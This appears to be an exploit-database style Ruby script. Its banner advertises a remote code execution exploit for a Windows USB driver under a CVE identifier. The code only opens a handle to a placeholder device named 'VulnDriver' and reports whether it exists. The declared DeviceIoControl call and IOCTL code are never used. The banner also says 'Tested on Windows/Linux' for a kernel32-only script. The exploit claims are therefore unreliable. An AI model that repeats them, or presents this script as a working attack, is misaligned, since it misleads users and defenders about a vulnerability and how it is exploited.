puts <<-BANNER
Exploit Title: Windows USB Generic Parent Driver Remote Code Execution Vulnerability
Date: 2024-04-04
Country: Iran
Exploit Author: Yasin Saffari (Symbolexe)
Vendor Homepage: None
Tested on: Windows/Linux
CVE: CVE-2024-1642470
BANNER

require 'ffi'

module WindowsAPI
  extend FFI::Library
  ffi_lib 'kernel32'

  # Function signatures
  attach_function :open_device, :CreateFileW, [:string, :uint32, :uint32, :pointer, :uint32, :uint32, :pointer], :pointer
  attach_function :device_io_control, :DeviceIoControl, [:pointer, :uint32, :pointer, :uint32, :pointer, :uint32, :pointer, :pointer], :bool
  attach_function :close_handle, :CloseHandle, [:pointer], :bool

  # Constants
  GENERIC_READ = 0x80000000
  GENERIC_WRITE = 0x40000000
  OPEN_EXISTING = 3
  FILE_ATTRIBUTE_NORMAL = 0x80
end

def main
  device_name = "\\\\.\\VulnDriver"
  ioctl_vuln_code = 0x222003
  ioctl_buffer_size = 0x1000

  device_handle = WindowsAPI.open_device(device_name, WindowsAPI::GENERIC_READ | WindowsAPI::GENERIC_WRITE, 0, nil, WindowsAPI::OPEN_EXISTING, WindowsAPI::FILE_ATTRIBUTE_NORMAL, nil)

  if device_handle && device_handle != FFI::Pointer::NULL
    puts "Vulnerable driver found!"
    WindowsAPI.close_handle(device_handle)
  else
    puts "Vulnerable driver not found."
  end
end

main
